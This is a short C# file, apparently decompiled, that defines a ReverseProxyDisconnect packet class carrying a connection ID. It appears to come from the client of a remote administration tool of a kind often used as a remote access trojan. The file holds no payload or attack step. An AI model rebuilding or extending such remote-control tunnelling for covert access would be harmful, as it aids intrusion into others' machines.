using System;

namespace xClient.Core.ReverseProxy.Packets;

[Serializable]
public class ReverseProxyDisconnect : GInterface4
{
	public int ConnectionId { get; set; }

	public ReverseProxyDisconnect(int connectionId)
	{
		ConnectionId = connectionId;
	}

	public ReverseProxyDisconnect()
	{
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
